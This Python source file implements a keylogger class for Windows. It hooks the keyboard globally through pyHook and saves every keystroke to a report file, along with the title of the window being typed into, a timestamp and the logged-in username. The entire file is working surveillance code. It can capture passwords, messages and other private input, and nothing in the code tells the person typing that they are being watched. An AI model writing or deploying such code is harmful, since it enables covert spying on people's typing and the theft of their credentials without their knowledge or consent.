#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'Zunayed Hassan'

import threading
import pyHook
import pythoncom
import time
import getpass
from CommonTools import *
from Settings import *


"""
CLASS NAME:     Keylogger

PURPOSE:        To monitor user keystroke. If user press anything record that key and save it.
"""
class Keylogger(threading.Thread):
    _lastWindowName = ""

    def run(self):
        # Adding header
        SaveContent(KEY_LOGGER_REPORT_FILE_NAME, "\n\n---[ MONITORING STARTED AT " + time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(time.time())) + " by " + getpass.getuser() + " ]---")

        hookManager = pyHook.HookManager()
        hookManager.KeyDown = self._onKeyboardEvent
        hookManager.HookKeyboard()

        pythoncom.PumpMessages()


    """
    EVENT NAME:    _onKeyboardEvent

    ALGORITHM:     If user pressed anything then,
                       1. Get title of window, where user is typing
                       2. Get time when typing
                       3. Find out what is user typing
                       4. Save them all
    """
    def _onKeyboardEvent(self, event):
        if self._lastWindowName != event.WindowName:
            text = "\n\n" + str(event.WindowName) + " at " + time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(time.time())) + ":\t"
            SaveContent(KEY_LOGGER_REPORT_FILE_NAME, text)
            self._lastWindowName = event.WindowName

        # If user press [ ENTER ]
        if event.KeyID == 13:
            text = "\n[Return]"

        # Or, if user pressed [ALT]
        elif event.KeyID == 165:
            text = "[Alt]"

        # Or,  if user pressed [ <- BACKSPACE ]
        elif event.KeyID == 8:
            text = "[Back]"

        else:
            text = chr(event.Ascii)

        # Save them all
        SaveContent(KEY_LOGGER_REPORT_FILE_NAME, text)

        return True